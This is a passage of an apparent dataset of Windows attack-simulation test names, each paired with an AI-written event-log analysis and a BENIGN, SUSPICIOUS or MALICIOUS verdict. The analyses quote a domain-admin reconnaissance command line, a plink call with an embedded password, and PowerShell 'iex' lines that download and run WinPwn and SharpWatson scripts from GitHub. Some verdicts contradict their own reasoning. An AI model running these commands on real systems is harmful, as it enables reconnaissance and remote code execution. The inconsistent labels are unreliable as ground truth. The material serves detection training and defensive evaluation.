- **Privilege and Authority**: The presence of multiple high-level processes executed by an account with elevated privileges demands closer inspection. While there is no direct evidence of malicious activity, the conditions are conducive to potentially harmful actions if controlled by an adversary.

### Conclusion:
Given the nature of the processes executed and the privileges used, this activity merits further investigation to ensure there is no adverse behavior. There is no definitive indication of compromise; however, the combination of elevated privileges and command execution suggests a need for caution.

### Resolution:
- **SUSPICIOUS**: The activity is suspicious due to the elevated privileges and sequence of command executions, warranting further examination to rule out malicious intent. It is recommended to:
  - Review account and system usage to ensure that the command executions were authorized and intended.
  - Conduct an audit of the user's recent activities and cross-check with logs from other systems for correlation.
  - Implement stricter monitoring and alerting for similar activities in the future to quickly detect and respond to potential threats."
Security Software Discovery - Windows Defender Enumeration,"## Detailed Analysis

### Overview
The provided logs include Windows PowerShell, System, Security, Sysmon, and Application logs from a computer named `Server002`. The logs capture events occurring on October 26th, 2024. I will outline the observations from each log type to determine if there is any indication of malicious activity.

### Windows PowerShell Log
The PowerShell logs indicate a PowerShell session executing commands related to Windows Defender:
- **Commands Executed:**
  - `Get-Service WinDefend`: Checks the service status of Windows Defender.
  - `Get-MpComputerStatus`: Provides the current status of Windows Defender.
  - `Get-MpThreat`: Lists threats that have been detected by Windows Defender.

**Assessment**: The commands executed are legitimate PowerShell cmdlets used for querying Windows Defender's status and its findings related to malware threats. No evidence in these logs suggests malicious intent by the command executor. 

### System Log
The System logs show kernel and time service events:
- **Kernel-General and Time Service**:
  - The events involve time synchronization, with `svchost.exe` appearing as the responsible process.
  - The `NewTime` and `OldTime` entries suggest normal time adjustments, possibly due to NTP corrections.

**Assessment**: These are typical system events for time synchronization, especially with NTP servers like `time.windows.com`. No unusual behavior is detected.

### Security Log
The Security logs include time change events by the LOCAL SERVICE account using `C:\Windows\System32\svchost.exe`:
- **Time Change**:
  - The time was changed by processes owned by `svchost.exe`. This aligns with normal system behavior where services under `svchost` manage time synchronization.

**Assessment**: The behavior seems legitimate. The changes were performed by a system process, `svchost.exe`, under the LOCAL SERVICE account, which is typical for time synchronization tasks.

### Sysmon Log
The Sysmon logs show various processes executed:
- **Processes Observed**:
  - Multiple instances of whoami, conhost, and hostname executed by `SERVER002\admin_test`.
  - Numerous updates related to Microsoft Edge and EdgeUpdate executables with SYSTEM level integrity.

**Assessment**: 
- The execution of `whoami` and `hostname` are typically used for system enumeration but are not inherently malicious on their own.
- The Microsoft Edge Update processes are signed by Microsoft and follow regular update patterns.
- No Sysmon entries exhibit signs of malicious behavior such as unsanctioned privilege escalation or execution of non-standard executables.

### Application Log
- **Edge Update Events**:
  - The logs report ""Service stopped"" events associated with `edgeupdate`, aligning with regular software update activities.

**Assessment**: Stopping and starting update services like `edgeupdate` is typical behavior during software update cycles.

## Conclusion

### Threat Assessment
After reviewing the logs, there is no explicit indication of malicious activity. The events logged describe normal system and user operations regarding regular maintenance, time synchronization, and software updates. The activities recorded do not reflect anomaly patterns or unauthorized access attempts.

### Resolution
- **BENIGN**: The logs demonstrate benign activities related to routine system operations and legitimate administrative tasks.

### Guidance
As there are no indications of threats or compromise, no immediate remediation actions are necessary. It would be prudent to maintain regular monitoring for any deviation from this baseline of expected behavior and continue using best practices for system security and incident detection."
Basic Permission Groups Discovery Windows (Domain),"### Analysis of Windows Event Logs:

**1. Overview of Encountered Log Events:**
- Multiple logs show **process creation** events using utilities like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`, `net.exe`, `net1.exe`, and `svchost.exe`.
- A specific log event points to the execution of `cmd.exe` with a command to list and view domain groups (`net localgroup`, `net group /domain`) which includes ""enterprise admins"" and ""domain admins"".
  
**2. Highlighted Suspicious Activities:**
- **Command Execution:** The use of `cmd.exe` with command-line arguments `\""cmd.exe\"" /c net localgroup & net group /domain & net group \""enterprise admins\"" /domain & net group \""domain admins\"" /domain` suggests a reconnaissance activity to enumerate sensitive domain groups, which is often associated with privilege escalation or lateral movement efforts.
- **High Integrity Level:** `cmd.exe` and associated processes operate at a **high integrity level**, indicating elevated privileges. When combined with attempts to access domain administrative groups, this is particularly concerning.
- **Behavior Context:** Tools like `whoami.exe` and `hostname.exe` used before potentially malicious commands could imply a preparatory phase to understand system context, which adversaries often do.

**3. Non-Suspicious/Benign Events:**
- System and kernel events related to time service and `svchost.exe` show time synchronization activities, which are common and expected behaviors.

### Assessment:

The sequence of events depicts typical steps in a malicious scenario where:
- There is execution of several system utilities (`wevtutil.exe`, `hostname.exe`, `whoami.exe`) often used by attackers for enumeration.
- An elevated privilege context is present and used in conjunction to run commands that query for membership of powerful Active Directory groups like ""domain admins"" and ""enterprise admins"", which could indicate preparation for further compromise or privilege escalation.

### Conclusion:

Given the evidence of potential reconnaissance and attempts to access sensitive group information under elevated privileges, this activity is classified as:

- **MALICIOUS**

### Recommended Next Steps:
- **Immediate Action:**
  - Isolate the affected machine from the network to prevent further actions by the adversary.
  - Perform a full forensic analysis on the machine to gather evidence and understand the full extent of the compromise.
  
- **Further Investigation:**
  - Review login sessions and access logs for unusual patterns or unauthorized changes.
  - Analyze user accounts and privileges, particularly ""SERVER002\\admin_test"", to identify any unauthorized modifications or creations.
  
- **Prevention Measures:**
  - Consider implementing stricter monitoring and logging for the sensitive commands and processes identified.
  - Ensure that domain and local administrative access are strictly controlled and audited.
  
- **Communication:**
  - Notify key stakeholders and prepare for a potential incident response depending on findings during further investigation. 

This plan provides both a tactical and strategic response to the identified threats, aligning immediate containment with long-term security posture enhancement."
ESXi - Enumerate VMDKs available on an ESXi Host,"Upon analyzing the provided Windows event logs, several indicators suggest potentially malicious activity that warrants further investigation:

1. **Usage of Plink.exe**: 
   - The event log indicates the execution of `plink.exe`, a command-line network connection tool commonly associated with SSH connections. It is being executed with a specific set of arguments including a password (`-pw ""pass""`) and a command file (`-m ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\esxi_file_discovery.txt""`). 
   - The use of Plink with embedded credentials is suspicious as it could indicate unauthorized access, tunneling, or data exfiltration attempts, especially if not part of regular operations.

2. **Frequent Execution of PowerShell and Wevtutil**:
   - Multiple instances of PowerShell and `wevtutil.exe` are noted within a short time frame. While these tools are legitimate components of the Windows operating system, they are often used by attackers to execute scripts, modify permissions or manipulate event logs for malicious purposes.

3. **High Privilege Level**:
   - Many of the executed processes are running at a high integrity level, indicating they have significant privileges within the system. High privilege execution of unusual or uncommon processes without a clear reason could suggest privilege escalation attempts.

4. **Windows Command Processor Commands**:
   - `cmd.exe` was used with commands that include references to `plink.exe` and potential interfacing with remote systems. The command `/c echo """" | ...` is often seen when attempting to suppress command output or errors, which might suggest an attempt to obfuscate actions.

5. **Use of Whoami.exe**:
   - The execution of `whoami.exe` could indicate an actor checking for the current permissions of the account to understand what level of access they have on the compromised machine.

6. **Event Shutdown and Creation**:
   - The application log shows `edgeupdate` service stops, which might be normal behavior for the Microsoft Edge Update process. However, repeated stopping or anomalous behavior in conjunction with other suspicious activity can indicate attempts to disable security services or other critical software.

Considering these observations, there are strong indicators that the activities logged could be part of a compromise or unauthorized access attempt, especially given the combination of credential use with Plink, privilege-level manipulations, and intensive process activity within a short period.

**Resolution: SUSPICIOUS**
- Further investigation is required to understand the context and legitimacy of these process executions, particularly around the use of Plink.
- Steps to verify the authenticity and integrity of the involved files should be conducted.
- An incident response should be triggered to evaluate the full scope of the potential compromise, including network traffic analysis and system integrity verification.
- Audit logs should be reviewed for anomalous entries, user account activities should be validated, and access to sensitive information should be evaluated.
- Implement additional monitoring to ensure rapid detection and response to similar activities in the future."
WinPwn - spoolvulnscan,"Let's break down the findings from each log category to identify any potential threats or anomalous behavior:

### Sysmon Log Analysis
The logs show multiple executions of standard Windows executable files, such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `powershell.exe`:

1. **wevtutil.exe and conhost.exe** are legitimate system utilities. However, the repeated and clustered execution of these utilities by `SERVER002\admin_test` within seconds, without further context or accompanying command-line arguments, may raise suspicion as they might indicate log manipulation efforts or be part of a script/automated task.
   
2. **hostname.exe and whoami.exe** are executed, with `whoami.exe` typically used to query the current user context. This could be benign, depending on context, but multiple quick successive calls without specific purpose can be scrutinized.

3. **PowerShell Activity**: The PowerShell command is particularly concerning. It fetches a script (`WinPwn.ps1`) from a GitHub repository (`S3cur3Th1sSh1t`). This indicates potentially malicious activity as it executes a script from an external source without any apparent legitimate reason.

### Application Log Analysis
The entries indicate routine system operations, such as Windows Defender being enabled. No anomalies were detected here that indicate an immediate threat.

### Security Log Analysis
There are events related to time change (EventID 4616) initiated by `svchost.exe`. Time anomaly manipulation might be part of sophisticated attempts to evade detection or timestamp logs. However, if this is an isolated event without further anomalous activity, it may not indicate a threat.

### Windows PowerShell Log Analysis
The PowerShell logs confirm the execution of a potentially harmful PowerShell command. This operation downloads and presumably runs a script from an external source (GitHub), consistent with living-off-the-land techniques that attackers use.

### System Log Analysis
Nothing suspicious was observed in the system logs other than time adjustments, which correlate with the security log entries. These events alone do not raise alarms without being paired with other malicious indicators.

### Concerns and Assessment
The key concern is the PowerShell activity that attempts to download and execute a script from a repository known for hosting penetration testing tools. Without proper change management records or a valid approved action, this behavior is typically considered suspicious.

### Resolution
Given the above analysis, the logs reveal activity that suggests potential compromise through the use of a suspicious PowerShell command. While there isn't concrete evidence across all logs to mark this as definitively malicious (e.g., no direct exploitation of services or clear signs of damaging actions), the PowerShell activity warrants urgent attention.

### Recommended Resolution: SUSPICIOUS
This assessment leads us to classify the activity as **SUSPICIOUS**. There should be further investigation into the purpose and legitimacy of the PowerShell command retrieving remote content. Immediate steps should include:

1. **Quarantine the host (Server002)**: Prevent further potential spread or execution of unauthorized scripts.
2. **Analyze and Review**: Check for any other usage or artifacts related to the `WinPwn.ps1` script.
3. **Impact Assessment**: Conduct a thorough investigation to understand if the downloaded script was executed and its impact assessment.
4. **User Inquiry**: Validate with `SERVER002\admin_test` if they initiated this action or if their account may be compromised.
5. **Update Security Controls**: Enhance monitoring and possibly disable internet access for PowerShell unless explicitly required.

A detailed investigation beyond these logs is crucial to determine the scope and impact of these activities accurately."
Enumerate COM Objects in Registry with Powershell,"Based on the provided Windows event logs, here's a detailed analysis:

**System Log:**
- The System log entries largely consist of Windows Update activities related to Microsoft Defender Antivirus updates. These are routine system maintenance tasks and do not indicate any suspicious activities.

**Security Log:**
- Several `EventID 4624` and `EventID 4672` entries indicate successful logon events and special privileges assigned to the user `SYSTEM`. The privilege assignment includes common administrator-level privileges.
- There are multiple `EventID 5379` entries, indicating credential read operations, which were not successful (ReturnCode: `3221226021`). While this might suggest attempts to access Microsoft accounts or Windows Live services, the consistent failure and absence of other suspicious indicators suggest routine or failed tasks rather than malicious intent.
- The appearance of the user `admin_test` with elevated privileges (`EventID 4672`) requires attention, but correlating it with logon events of the same user via known processes does not flag this as malicious, assuming the account is valid and authorized.

**Application Log:**
- The logs show the state of Windows Defender being enabled, which is expected and non-suspicious.

**Windows PowerShell Log:**
- The presence of PowerShell script execution is noteworthy. The script involves registry access and CLSID enumeration, which can be indicative of reconnaissance activity. This could potentially be a sign of suspicious behavior or advanced system configuration tasks. The context around why this script is executed would need further investigation to determine its legitimacy.

**Sysmon Log:**
- A variety of system and user processes are logged. Notably, processes like `wevtutil.exe`, `powershell.exe`, and others running under the `admin_test` user raise flags for potential misuse. However, without additional context or evidence of abuse, these activities may be part of normal administrative operations.
- The sequence of executed processes appears conventional for a Windows environment, given regular software updates and executions.

**Indicators of Compromise:**
- The primary area of concern is the PowerShell activity, which involves accessing and attempting to manipulate the registry. This could be legitimate scripting by an admin or setup scripts from certain software, or it could be an indicator of attempt to explore or potentially exploit the system through scripting.

**Conclusion:**
After careful review, there is no definitive evidence of malware or direct compromise from the logs provided. However, the PowerShell executions indicate potentially suspicious behavior that should be further scrutinized to rule out malicious intent.

**Resolution: SUSPICIOUS** - The PowerShell activities outlined require additional investigation to ascertain their intent and whether they are part of legitimate admin tasks. Further monitoring of the `admin_test` account and associated process activities should be conducted to ensure no unauthorized actions occur."
Windows MachineGUID Discovery,"In analyzing the provided Windows event logs for Server002, a series of Sysmon, Application, System, and Security logs have been examined to assess possible indicators of malicious activity.

### Analysis:

1. **Sysmon Logs:**
   - **Whoami and Hostname Executions:** Both `whoami.exe` and `hostname.exe` being executed appear numerous times. These tools are typically used to gather information about the current logged-in user and the host system. While not inherently malicious, frequent execution may indicate someone is attempting to understand the environment, potentially as part of reconnaissance.
   - **Wevtutil and Conhost Executions:** `wevtutil.exe` is a legitimate Windows utility used to manage event logs. Its frequent execution, alongside `conhost.exe`, a Console Window Host, could indicate an attempt to enumerate or clear event logs to cover tracks if the system was compromised. Without further context, it remains a point of concern.
   - **CMD and REG Executions:** The execution of `cmd.exe` with a command to query the registry (`REG QUERY`) suggests someone might be exploring registry keys, potentially to gather system or application-specific information like `MachineGuid`. This activity can be benign or a part of a reconnaissance step used by malware or pen testers.

2. **System and Security Logs:**
   - **Time Change Events:** Multiple instances of time changes via `svchost.exe` are recorded. This can sometimes be indicative of an attacker attempting to manipulate time settings to confuse timestamps and logs, but this alone is not definitive of malicious activity without further supporting evidence.

3. **Application Log:**
   - No direct evidence of malicious activities or error logs from applications that are reported.

4. **Privilege and Execution Details:**
   - All involved processes appear to have executed under the administrative user `admin_test` on a high integrity level. It's essential to confirm that `admin_test` should indeed be performing these actions.

### Threat Assessment:
The logs indicate several suspicious activities: frequent execution of system utilities that could be used for reconnaissance, registry querying, and time manipulations. These behaviors warrant caution.

### Recommendation:
- Conduct a thorough investigation of the user `SERVER002\\admin_test` to ascertain if the actions align with expected administrative activities. Ensure that `admin_test`'s credentials haven't been compromised.
- Verify if `wevtutil.exe` and other utilities' usage align with legitimate administrative tasks through cross-referencing with scheduled tasks or maintenance logs.
- Review network traffic and other security logs for additional context or anomalies that could support or refute potential malicious intent.
- Depending on the outcome, consider auditing access controls and reviewing system configurations to mitigate potential vulnerabilities.

### Conclusion:
Based on current evidence, the overall resolution is **SUSPICIOUS**. This activity requires further investigation to either unearth a malicious actor's presence or dismiss it as routine operations by a legitimate user."
Suspicious LAPS Attributes Query with Get-ADComputer ms-Mcs-AdmPwd property,"**Analysis of the Provided Windows Event Logs**

Upon reviewing the provided logs, I have identified the following notable events and potential concerns:

### System and Security Logs:
- **Time Change Events:** 
  - The logs show multiple `Microsoft-Windows-Kernel-General` EventID 1 and 24, indicating time changes on the system. Such events are standard when time synchronization occurs but can be concerning if unexplained time modifications are detected.
  - Security log 4616 corresponds to these time set events, indicating changes from a newer time to an older time, which can occasionally be exploited by attackers to cover tracks or reset certain counters or logs.

### PowerShell Logs:
- **PowerShell Execution:**
  - The logs show the execution of PowerShell with a command to get Active Directory properties, specifically querying for machine account passwords (ms-Mcs-AdmPwd and ms-Mcs-AdmPwdExpirationTime). Access to these properties can be sensitive as they involve passwords for machine accounts managed by Microsoft's Local Admin Password Solution (LAPS).
  - This command was executed by 'SERVER002\admin_test', showing a potential privilege or interest in retrieving administrative credentials.

### Sysmon Logs:
- **Process Executions:**
  - We observe routine process executions like `wevtutil.exe` and `conhost.exe`. They were executed under the 'SERVER002\admin_test' user, which aligns with regular usage but requires context for the executed commands.
  - The execution of `whoami.exe` and `hostname.exe` by 'SERVER002\admin_test' suggests activity indicative of environment reconnaissance, which could be typical for scripting or admin tasks but can be concerning without a legitimate reason.
- **Edge Update Activity:**
  - There is considerable activity related to Microsoft Edge Update processes, including processes with commands for updating and registering components. These seem routine as per software update procedures.

### Application Logs:
- **Edge Update Notifications:**
  - The messages indicate the stopping of Edge Update services. These align with the Sysmon logs indicating update and registry events and do not inherently convey suspicion as part of scheduled activities.

### Assessment:
- Based on the analysis, activities such as the PowerShell execution querying LAPS properties and repeated setting of system time are points of interest. The PowerShell command to access administrative passwords, especially with high integrity and the presence of repeated system time changes, could potentially align with tactics used in lateral movement or privilege escalation.
- However, there's no explicit evidence within the logs to definitively attribute these actions to a malicious actor, nor is there clear evidence of a compromise or persistence mechanism being deployed.

### Resolution:
- **SUSPICIOUS**: The presence of PowerShell commands related to LAPS properties and time adjustments warrant further investigation. These actions, while not definitively malicious, could indicate preparation for or execution of activities aimed at increasing access to sensitive areas of the network.

**Guidance on How to Proceed:**
1. **Verify Legitimacy**: Check with the IT or administrative team whether these PowerShell commands and time changes were authorized or part of a scheduled task.
2. **Further Investigation**: Monitor for any recurrence of similar behaviors and correlate with user activities during the same time frame.
3. **Review LAPS Access**: Investigate logs and policies around systems and users accessing LAPS properties. Ensure that such accesses are logged and reviewed regularly.
4. **Enhanced Monitoring & Alerts**: Implement alerts for unusual access patterns to sensitive Active Directory properties and time-change events that do not correspond with expected system tasks.
5. **Regular Patch & Verification**: Confirm that the system and applications like Microsoft Edge are consistently updated to prevent exploitation through outdated software."
Examine domain password policy - Windows,"### Analysis of Windows Event Logs

After carefully examining the provided logs, here's a detailed analysis of activities observed on the host `Server002`:

#### System and Security Logs
- **Time Manipulation Events**: 
  - Multiple `Kernel-General` events with `EventID` 1 indicate that the system time was changed (`NewTime` is earlier than `OldTime`). The process responsible is `svchost.exe`, which typically runs multiple system services.
  - Security `EventID` 4616 corroborates these time changes occurring under the context of `LOCAL SERVICE`.
  - Such time changes can be part of regular system behavior (e.g., time synchronization) but could potentially indicate tampering if occurring outside maintenance windows.

#### User Logon and Privilege Escalation
- **Admin Logon Events**: 
  - Security logs show `4624` (successful logon) and `4634` (logoff) events for the user `admin_test` using NTLM authentication with `LogonType` 3 (network logon).
  - It is noteworthy that `admin_test` acquires a host of privileges (e.g., `SeDebugPrivilege`, `SeLoadDriverPrivilege`) as seen in events `4672`. These privileges are significant and could potentially be misused if obtained by a malicious user or malware. However, NTLM usage and these privileges could be part of regular admin operations depending on the network setup.

#### Sysmon Logs
- **Execution Monitoring with Process Creations**:
  - There is frequent execution of administrative tools like `wevtutil.exe`, `cmd.exe`, `net.exe/net1.exe`, and other utilities (like `whoami.exe` and `HOSTNAME.EXE`), primarily under the context of `SERVER002\admin_test`.
  - The command `cmd.exe /c net accounts /domain` indicates possible querying of domain account policies, which can be part of normal admin checks but could also imply reconnaissance if done unexpectedly.

#### Application Logs
- The entry from the `Microsoft-Windows-Security-SPP` log is related to the Software Protection Platform, noting routine operations (`RulesEngine`), which seems benign.

### Conclusion

Based on the detailed scrutiny of the logs:

- **Time changes without an apparent reason** or outside standard synchronizations are somewhat suspicious. They could mean an attempt to erase or forge audit trails, especially if they align with suspicious admin activity or odd network connections.
- **Privileged operations and tool executions by `admin_test`** may indicate further investigation is necessary to ensure these were legitimate.
- **Reconnaissance Commands** used (`net accounts /domain`) should be verified against standard operational or diagnostic tasks for `admin_test`.

Given these observations:

### Resolution: SUSPICIOUS

The log entries contain activities that merit further investigation. Focus should be given to:
- Confirming intended time changes and ensuring they align with maintenance operations.
- Verifying that `admin_test`'s activities, privilege escalations, and command executions were routine and sanctioned.
- Reviewing network connections and any related logs for potential follow-up data exfiltration or lateral movement.

### Recommendations:
- Conduct an internal inquiry with the system administrators to validate the legitimacy of the actions seen.
- Enhance monitoring for `admin_test` and similar privileged accounts.
- Analyze network logs for any anomalies during this period.
- Consider implementing stricter time synchronization and audit policy enforcement to detect and respond to unauthorized changes quickly."
Use of SecEdit.exe to export the local security policy (including the password policy),"Upon analyzing the provided Windows event logs, here is the detailed analysis focusing on the indicators of suspicious or potentially malicious activity:

### Key Observations:

1. **Microsoft Edge Update Activity**:
   - Multiple events involve `MicrosoftEdgeUpdateComRegisterShell64.exe` and `MicrosoftEdgeUpdate.exe`, executed under the `NT AUTHORITY\SYSTEM` user. This is a normal user account for system-level processes, especially for software updates like Edge. The command line arguments utilized, such as `/regserver`, `/svc`, `/ua /installsource core`, are typical for legitimate update processes. The presence of consistent SHA256 hashes suggests the integrity of the files hasn't been tampered with.

2. **Use of Built-in System Utilities**:
   - **whoami.exe** and **hostname.exe** executions were observed. Both processes are benign utilities used to display user information and the computer name respectively. They were executed under the `SERVER002\admin_test` user with `High` integrity level, which aligns with typical admin-level activities.
   - **cmd.exe** invocation with **secedit.exe** for exporting the security policy is logged. This sequence could be benign if related to legitimate security audits or system configuration checks conducted by an administrator.

3. **Frequent Usage of wevtutil.exe**:
   - Several instances of `wevtutil.exe` execution by `SERVER002\admin_test` are noted. This utility manages event logs and is part of regular system administration but could also signal an attempt to query or clear event logs if used malevolently. However, without evidence indicating log tampering or deletion, this remains in the realm of typical system admin behavior.

4. **Execution of Conhost.exe**:
   - Numerous `conhost.exe` executions appear following commands involving command-line and scripting utilities, indicating console management activities. This is normal behavior when managing tasks via command line and generally aligns with administrative operations.

5. **No Unusual Command-Line Arguments or Privilege Escalation Attempts**:
   - There are no evident command-line arguments that imply privilege escalation or backdoor creation. Processes run at high integrity levels are consistent with administrative actions conducted by an `admin_test` user account.

### Assessment:

Primarily, the logs display activities typical of a Windows system engaged in regular updates and possible administrative task executions. The actions logged, such as software updates by Microsoft Edge and the use of diagnostic and management utilities by `SERVER002\admin_test`, align with legitimate tasks. There are no detected involvement of unusual or unexpected network connections, extensions, or hashes associating with known malware.

**Potential Suspicious Activity**:
While the use of `wevtutil.exe` several times might require contextual verification, considering the rest of the observed behavior and processes doesn’t show any concerning anomalies or patterns indicative of a compromise.

### Resolution:

**SUSPICIOUS**: While most activities resemble typical admin operations, frequent use of `wevtutil.exe` for event log management warrants further investigation to confirm intent, especially in the context of a security audit or expected system-wide maintenance. Verifying recent administrative tasks with the IT or SysAdmin team would clarify legitimacy.

### Recommendation:

- Conduct a review with the IT operations team regarding recent administrative actions on `SERVER002`.
- Carry out threat-hunting measures around the user `admin_test` to rule out insider threats or compromised accounts.
- If available, check other systems for similar patterns to ensure no broader compromise.
- Continue monitoring for any escalation in similar activities or deviation in behavior across endpoints."
System Discovery using SharpView,"### Analysis of Logs:

Upon reviewing the provided Windows event logs, several entries draw attention to possible indicators of malicious activity:

1. **Sysmon Logs**:
    - Multiple instances of **`powershell.exe`** running with suspicious command-line arguments, `""Invoke-ACLScanner""`, `""Invoke-Kerberoast""`, and `""Find-DomainShare""`. These scripts are often used in reconnaissance or privilege escalation attempts in a Windows environment, especially when associated with `SharpView`, a tool used for enumerating Active Directory environments.
    - The operations appear to have been executed under a high integrity level, which means they were running with significant privileges (potentially elevated).

2. **PowerShell Logs**:
    - Corroborate the Sysmon logs showing PowerShell sessions being started with these aforementioned suspicious scripts, which are indicators that someone could be running a script in the context of PowerShell to gather information or perform unauthorized tasks on the network.

3. **Security Logs**:
    - Logon events for `SYSTEM` and an administrative session (`admin_test`) repeatedly occur, indicating potential privilege escalation or lateral movement attempts by an attacker achieving SYSTEM-level access.

4. **Application Logs**:
    - Windows Defender appears to be active but does not seem to have intercepted the said suspicious activities, which might indicate that these actions went undetected or weren't flagged by Defender.

### Assessment:
- The presence of SharpView in combination with suspicious PowerShell commands strongly suggests reconnaissance and possible lateral movement in an Active Directory environment.
- Processes executed under high integrity levels without context for a legitimate purpose, especially those handling tasks linked to SharpView, present a relevant threat.

### Guidance and Resolution:
1. **Immediate Isolation**: The machine, specifically Server002, should be isolated from the network to prevent further spread or escalation.
2. **In-depth Investigation**: Conduct a deeper forensic investigation to examine the scope and depth of the scripts executed. Evaluate any potential compromise of credentials and look into network flow to review access attempts to other servers.
3. **Credential Audit**: Advisable to reset passwords for administrative accounts and consider reviewing any service accounts potentially exposed during the script execution.
4. **Security Enhancement**: Increase PowerShell logging details, disable Powershell script execution for unauthorized users, and consider enabling AMSI (Antimalware Scan Interface) integration.

**Resolution: MALICIOUS** - The logs show clear indicators of potentially malicious activity, focused around reconnaissance and privilege escalation tactics typically associated with malicious actors exploring network and directory services."
Security Software Discovery - AV Discovery via Get-CimInstance and Get-WmiObject cmdlets,"### Analysis:

Upon reviewing the given Windows event logs, some notable observations can be drawn. Let's break down the analysis of these logs in different categories:

#### System Logs:
- **Kernel-General Events (Event ID: 24):** These events indicate a time change on the system, where there's a small adjustment from ""21:32:53.1013781"" to ""21:33:10.4678868"" and further minimal changes. Time changes can sometimes be indicative of malicious activity if they're done to manipulate logs; however, these look like standard time-sync adjustments with a time source of `time.windows.com` as per the Time Service Event (Event ID: 35).

#### Sysmon Logs:
- **Process Creation Events (Event ID: 1):** We see several processes related to `MicrosoftEdgeUpdate` running, which is standard behavior for Microsoft Edge updates.
- **Processes of Interest:** We see executions of `wevtutil.exe` and `conhost.exe`, which alone isn't suspicious, but systematic high-volume executions might require context. This particularly looks like an administrative task perhaps tied to log handling.
- **Potentially Malicious Command:** There's a command-line seen executed via `cmd.exe` which calls PowerShell to execute `Get-CimInstance` and `Get-WmiObject` related to antivirus products. This action is atypical of standard user behavior and could be used to check for or manipulate security settings.

#### Windows PowerShell Logs:
- **Script Activity Logging (Event ID: 600 series):** The logs show `PowerShell` executing commands that probe the securityCenter2 namespace for antivirus product information. This could be a part of a script executing for valid purposes, but it is similarly an action performed in malware operations to understand existing defenses.

#### Application Logs:
- The logs related to `edgeupdate` services show regular stopping and starting behavior, which is typical for update service tasks, suggesting benign behavior.

#### Security Logs:
- **Time Change Events (Event ID: 4616):** These corroborate the System Logs showing small modifications in system time for synchronization purposes, indicating benign activity.

### Assessment:
The presence of `cmd.exe` executing PowerShell commands to query antivirus information stands out as the most suspicious activity in the logs. This, coupled with the `wevtutil` and `conhost` execution logs, indicates potentially suspicious behavior that might align with script execution to enumerate security products, possibly by a malware or a penetration testing tool.

### Resolution: **SUSPICIOUS**

- **Threats/Risks Identified:** The command-line operations involving PowerShell querying antivirus status could be part of malicious reconnaissance by a threat actor or routine scans by internal security tools.
- **Guidance:** 
  1. Confirm whether this activity was sanctioned, such as by a legitimate security assessment.
  2. Investigate the source and intention behind the execution of the PowerShell commands.
  3. Implement enhanced monitoring for similar activities and potential unauthorized scripts or changes.
  4. Verify integrity and security of administrative accounts (`admin_test`) used here.
  
Further investigation is advised to determine if the suspicious command execution aligns with any known malicious patterns or if it's part of routine processes in this environment."
WinPwn - PowerSharpPack - Watson searching for missing windows patches,"Based on the provided logs, let me analyze and highlight the suspicious or anomalous behavior:

### Analysis

1. **PowerShell Events:**
   - Across the PowerShell logs, there is evidence of script execution using `iex` (Invoke-Expression) to directly load and execute code from an external URL: `https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1`. 
   - The `Invoke-SharpWatson.ps1` script is a known open-source script often used for diagnostics but can also be adapted for potentially malicious purposes.
   - Use of `iex` and downloading code directly over the internet, especially from sites like GitHub, is highly suspicious in a secure corporate environment.

2. **Sysmon Events:**
   - Multiple instances of common system utilities such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` are running, all executed by the same user account `SERVER002\\admin_test`.
   - The usage of these programs themselves is not inherently suspicious; however, their combined execution along with the timing of PowerShell script execution raises some concern.

3. **Security & System Logs:**
   - Logs show common system processes executing (e.g., `svchost.exe`). However, there is an observed change in system time (`4616` event IDs), which might indicate irregular time adjustments, though they seem tied to normal `svchost.exe` operations.
   - No overt signs of privilege escalation or unauthorized logins were observed in the portion of Security and System logs provided.

### Assessment
- **Current Assessment:** The indications suggest that there might be a misuse of PowerShell to execute potentially harmful scripts downloaded from the internet. Although there are no definitive signs of compromise like credential theft or data exfiltration in the log snippets, this behavior is suspicious enough to warrant further scrutiny.

### Threats or Risks Identified
- The PowerShell operation that downloads and executes external scripts poses a security risk as it could harbor or transmit malicious payloads.
- There's a need to verify the intent behind the PowerShell command and check if it's aligned with company policy or operational needs.

### Guidance on How to Proceed
1. **Immediate Actions:**
   - Quarantine the machine (Server002) to prevent network access until a thorough investigation is conducted.
   - Review any network logs to check if the PowerShell script reach-out and execution had any subsequent network calls or data transfer activities.
   
2. **Further Investigation:**
   - Conduct a detailed malware scan on the host.
   - Check for any other events that may correlate with this unusual PowerShell behavior, such as newly created files, registry modifications, or anomalies in scheduled tasks or services.
   - Follow up with the user(s) involved (`admin_test`) to understand if they instigated this action or were aware of it.

3. **Preventive Measures:**
   - Enhance PowerShell logging to include transcript and module logging.
   - Modify group policies to restrict PowerShell commands that involve external script/block script downloads.
   - Evaluate and strengthen EDR/antivirus configurations to detect and mitigate such threats proactively.

### Final Resolution
- **Resolution:** SUSPICIOUS

Further investigation is essential before labeling this activity as definitively malicious. Make sure to examine the broader context of this activity and assess any potential impacts on other systems."
Process Discovery - PC Hunter,"Based on the analysis of the provided logs, the following are the observations and assessment of suspicious or anomalous behaviors:

1. **Security Log: Privilege Assignments and Logon Events**
   - The `admin_test` user was granted a range of high privileges, as indicated by Event ID 4672, which included several potentially risky privileges like `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`. These privileges are generally concerning if they are not typical for the role, allowing for system manipulation and potential unauthorized actions.
   - There are multiple logon events (Event ID 4624) for the `admin_test` user coming from an external machine named `DESKTOP-3HL5B2P` using NTLM authentication. Logon Type 3 indicates network logon, which is commonly seen, but it is suspicious due to its frequency and timing within a short period.
   - Quick successive logoffs (Event ID 4634) for the same user coincide with these logon events, suggesting irregular behavior may be automated or scripted.

2. **PowerShell Logs: Execution of External Tools**
   - The execution of a PowerShell command to run `PCHunter64.exe` is logged, which is unusual as `PCHunter` is a tool often used for deep system inspection and potential rootkit detection. Its location (`C:\\Temp\\Externalfiles\\PCHunter_free\\`), along with how it is executed via PowerShell, suggests this was executed possibly to bypass some restrictions or to utilize additional privileges.

3. **Sysmon Logs: Process Activity**
   - There were multiple executions of generic utilities like `wevtutil.exe`, `whoami.exe`, and other command prompt windows (`conhost.exe`) by `admin_test`. These tools can be used for gathering information and manipulating system logs.
   - The execution of `PCHunter64.exe` was corroborated in the Sysmon logs, aligning with the PowerShell log entries.

4. **System & Application Logs**
